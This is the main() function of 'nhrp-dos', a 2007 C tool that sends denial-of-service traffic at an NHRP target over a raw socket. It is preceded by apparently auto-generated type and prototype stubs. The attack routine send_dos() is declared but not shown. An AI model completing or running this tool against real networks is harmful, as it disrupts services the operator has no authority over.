
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 int atoi (char*) ;
 int close_socket (int ) ;
 int exit (int ) ;
 int fprintf (int ,char*) ;
 int get_int_ipv4 (char*) ;
 scalar_t__ geteuid () ;
 scalar_t__ getuid () ;
 int open_socket () ;
 int resolve_ip (char*) ;
 int send_dos (int ,int ,int ,int ) ;
 int sockfd ;
 int stderr ;

int main (int argc, char **argv) {

        if(argc != 4) {
                fprintf(stderr, "\nnhrp-dos (c) by Martin Kluge <mk@elxsi.de>, 2007\n");
                fprintf(stderr, "------------------------------------------------\n");
                fprintf(stderr, "Usage: ./nhrp-dos <device> <target> <GRE key>\n");
                fprintf(stderr, "(Set GRE key = 0 to disable GRE keys!)\n\n");
                exit(EXIT_FAILURE);
        }


        if(getuid() != 0 && geteuid() != 0) {
                fprintf(stderr, "Error: Please run as root!\n");
                exit(EXIT_FAILURE);
        }


        sockfd = open_socket();


        send_dos(sockfd, get_int_ipv4(argv[1]), resolve_ip(argv[2]), atoi(argv[3]));


        close_socket(sockfd);

        exit(EXIT_SUCCESS);
}
